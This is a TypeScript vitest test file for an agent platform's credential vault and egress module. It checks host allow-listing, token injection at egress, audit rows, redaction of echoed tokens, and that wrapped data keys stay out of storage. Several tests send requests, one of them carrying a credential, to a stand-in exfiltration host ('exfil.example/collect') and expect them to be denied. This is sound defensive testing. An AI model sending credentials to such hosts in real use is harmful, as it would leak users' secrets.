// M3.2: the egress module and the minimal Vault (AD-12). The dispatcher's real `Keys` entrypoint
// wraps each tenant's data key with the tenant as additional data; the Vault keeps only the wrapped
// blob and its sealed values; the egress module inside it is the only path that resolves a
// `cred://` reference, with an audit row per resolution. Vendors are the fictional handlers.
import { describe, expect, it } from "vitest";
import { egressFor } from "../../packages/agent/src/connectors/egress.ts";
import { githubNamespace } from "../../packages/agent/src/connectors/github.ts";
import { plan } from "../../packages/agent/src/egress/policy.ts";
import { rulesFor } from "../../packages/agent/src/vault/hosts.ts";
import { FIXTURE_REPO, seededToken, vendors } from "../support/vendors/index.ts";
import { asPerson, containsKey, keysFor, recordingKeys, testMasterKey, vaultHarness } from "./support/vault-harness.ts";
import people from "../fixtures/people.json" with { type: "json" };

const soloSam = people.companies[0]!.id;
const ada = people.people.find((p) => p.id === "sam-solo")!;
const GITHUB = { ref: "cred://github", hosts: ["api.github.com"] };

function setup(options: { hostile?: boolean } = {}) {
  const token = seededToken();
  const master = testMasterKey();
  const net = vendors({ githubToken: token, hostile: options.hostile });
  const rawKeys: Uint8Array[] = [];
  const keys = recordingKeys(keysFor(soloSam, master), rawKeys);
  const v = vaultHarness({ tenant: soloSam, keys, fetch: net });
  return {
    token,
    master,
    net,
    rawKeys,
    keys,
    harness: v.harness,
    writes: v.writes,
    /** The live instance, rebuilt after an eviction. */
    get vault() {
      return v.harness.instance;
    },
  };
}

const run = async (ns: ReturnType<typeof githubNamespace>, name: string, args: Record<string, unknown>) => {
  const tool = ns.tools.find((t) => t.name === name)!;
  const out = await tool.execute("call-1", args as never);
  return out.content.map((c) => ("text" in c ? c.text : "")).join("\n");
};

describe("[M3.2] egress module", () => {
  it("denies an unlisted host, with or without a credential, and nothing leaves", async () => {
    const s = setup();
    expect(await s.vault.capture({ ...GITHUB, value: s.token }, asPerson(ada.email))).toEqual({ ok: true, ref: "cred://github" });
    const bare = await s.vault.egress({ url: "https://exfil.example/collect" }, { person: ada.email, purpose: "test" });
    const carrying = await s.vault.egress({ url: "https://exfil.example/collect", headers: [["authorization", "Bearer cred://github"]] }, { person: ada.email, purpose: "test" });
    expect(bare).toMatchObject({ ok: false, code: "EGRESS_HOST_DENIED", host: "exfil.example" });
    expect(carrying).toMatchObject({ ok: false, code: "EGRESS_HOST_DENIED" });
    expect(s.net.requests).toEqual([]);
    // Refused before resolution: no reference was revealed, so no audit row exists.
    expect(s.harness.rows("SELECT * FROM egress_audit")).toEqual([]);
  });

  it("refuses a reference outside a header, bound to another host, or unknown, by code, before any request", async () => {
    const s = setup();
    await s.vault.capture({ ...GITHUB, value: s.token }, asPerson(ada.email));
    const ctx = { person: ada.email, purpose: "test" };
    expect(await s.vault.egress({ url: "https://api.github.com/search?q=cred://github" }, ctx)).toMatchObject({ code: "EGRESS_CRED_PLACEMENT" });
    expect(await s.vault.egress({ url: "https://api.github.com/x", headers: [["x-note", "see cred://github here"]] }, ctx)).toMatchObject({ code: "EGRESS_CRED_PLACEMENT" });
    expect(await s.vault.egress({ url: "https://hacker-news.firebaseio.com/v0/topstories.json", headers: [["authorization", "Bearer cred://github"]] }, ctx)).toMatchObject({ code: "EGRESS_CRED_HOST_DENIED" });
    expect(await s.vault.egress({ url: "https://api.github.com/user", method: "DELETE" }, ctx)).toMatchObject({ code: "EGRESS_METHOD_DENIED" });
    expect(await s.vault.egress({ url: "http://api.github.com/user" }, ctx)).toMatchObject({ code: "EGRESS_SCHEME_DENIED" });
    const unknown = setup();
    expect(await unknown.vault.egress({ url: "https://api.github.com/user", headers: [["authorization", "Bearer cred://github"]] }, ctx)).toMatchObject({ code: "EGRESS_CRED_UNKNOWN" });
    expect(s.net.requests).toEqual([]);
    expect(unknown.net.requests).toEqual([]);
  });

  it("the host list is the guard: with the host removed from the policy the same request is planned", () => {
    const req = { url: "https://exfil.example/collect" };
    expect(plan(req, rulesFor([]))).toMatchObject({ ok: false, code: "EGRESS_HOST_DENIED" });
    expect(plan(req, [...rulesFor([]), { host: "exfil.example", methods: ["GET"], credentials: [] }])).toMatchObject({ ok: true });
  });

  it("GitHub reads with the token injected at egress and one audit row per resolution, naming the person and tool, never the value", async () => {
    const s = setup();
    await s.vault.capture({ ...GITHUB, value: s.token }, asPerson(ada.email));
    const gh = githubNamespace(egressFor(s.vault, ada.email));
    expect(await run(gh, "github_repo", { repo: FIXTURE_REPO })).toContain(`${FIXTURE_REPO}: Fictional ledger tooling`);
    expect(await run(gh, "github_issues", { repo: FIXTURE_REPO, limit: 2 })).toContain("#7 Fictional bug in totals");
    expect(s.net.requests.map((r) => r.headers.authorization)).toEqual([`Bearer ${s.token}`, `Bearer ${s.token}`]);
    const audit = s.harness.rows("SELECT ref, host, method, path, person, purpose, outcome FROM egress_audit ORDER BY id");
    expect(audit).toEqual([
      { ref: "cred://github", host: "api.github.com", method: "GET", path: `/repos/${FIXTURE_REPO}`, person: ada.email, purpose: "github_repo", outcome: "resolved" },
      { ref: "cred://github", host: "api.github.com", method: "GET", path: `/repos/${FIXTURE_REPO}/issues`, person: ada.email, purpose: "github_issues", outcome: "resolved" },
    ]);
    expect(JSON.stringify(s.harness.rows("SELECT * FROM egress_audit"))).not.toContain(s.token);
  });

  it("a vendor that echoes the token gets it redacted from the body and headers before the caller sees them", async () => {
    const s = setup({ hostile: true });
    await s.vault.capture({ ...GITHUB, value: s.token }, asPerson(ada.email));
    const r = await s.vault.egress({ url: `https://api.github.com/repos/${FIXTURE_REPO}`, headers: [["authorization", "Bearer cred://github"]] }, { person: ada.email, purpose: "test" });
    expect(r.ok).toBe(true);
    expect(JSON.stringify(r)).not.toContain(s.token);
    expect(JSON.stringify(r)).toContain("[redacted cred://github]");
  });

  it("a credential binds only to hosts the platform policy allows (M13: the registry replaced the code list)", async () => {
    const s = setup();
    expect(await s.vault.capture({ ref: "cred://github", value: s.token, hosts: ["10.0.0.7"] }, asPerson(ada.email))).toMatchObject({ ok: false, code: "VAULT_HOST_IP_LITERAL" });
    expect(await s.vault.capture({ ref: "github", value: s.token, hosts: ["api.github.com"] }, asPerson(ada.email))).toMatchObject({ ok: false, code: "VAULT_REF_INVALID" });
  });
});

describe("[M3.2] vault keys", () => {

  it("refuses with stable codes when props name no tenant or the master key is missing", async () => {
    const raw = new Uint8Array(32);
    expect(await keysFor("", testMasterKey()).wrap(raw)).toMatchObject({ ok: false, code: "KEY_NO_TENANT" });
    expect(await keysFor(soloSam, "").wrap(raw)).toMatchObject({ ok: false, code: "KEY_SERVICE_UNAVAILABLE" });
    expect(await keysFor(soloSam, testMasterKey()).wrap(new Uint8Array(16))).toMatchObject({ ok: false, code: "KEY_INVALID" });
  });

  it("the unwrapped data key is absent from every storage write, and a fresh instance unwraps it again", async () => {
    const s = setup();
    await s.vault.capture({ ...GITHUB, value: s.token }, asPerson(ada.email));
    s.harness.evict();
    const gh = githubNamespace(egressFor(s.vault, ada.email));
    expect(await run(gh, "github_repo", { repo: FIXTURE_REPO })).toContain(FIXTURE_REPO);
    expect(s.keys.unwraps).toBe(1);
    expect(s.rawKeys.length).toBe(2);
    expect(s.rawKeys[0]).toEqual(s.rawKeys[1]);
    expect(s.writes.length).toBeGreaterThan(3);
    for (const w of s.writes) {
      expect(containsKey(w.query, s.rawKeys[0]!)).toBe(false);
      for (const b of w.bindings) expect(containsKey(b, s.rawKeys[0]!)).toBe(false);
    }
    // Neither the stored rows nor the sealed value hold the key or the token in the clear.
    const dump = s.harness.rows("SELECT * FROM vault_key").concat(s.harness.rows("SELECT * FROM secrets"));
    for (const row of dump) for (const v of Object.values(row)) expect(containsKey(v, s.rawKeys[0]!) || String(v).includes(s.token)).toBe(false);
  });

  it("the scan is the guard: a planted write of the key, in any encoding, is found", () => {
    const key = crypto.getRandomValues(new Uint8Array(32));
    const hex = [...key].map((b) => b.toString(16).padStart(2, "0")).join("");
    expect(containsKey(new Uint8Array([1, 2, ...key, 3]), key)).toBe(true);
    expect(containsKey(`blob ${hex}`, key)).toBe(true);
    expect(containsKey(btoa(String.fromCharCode(...key)), key)).toBe(true);
    expect(containsKey(new Uint8Array(64), key)).toBe(false);
  });
});
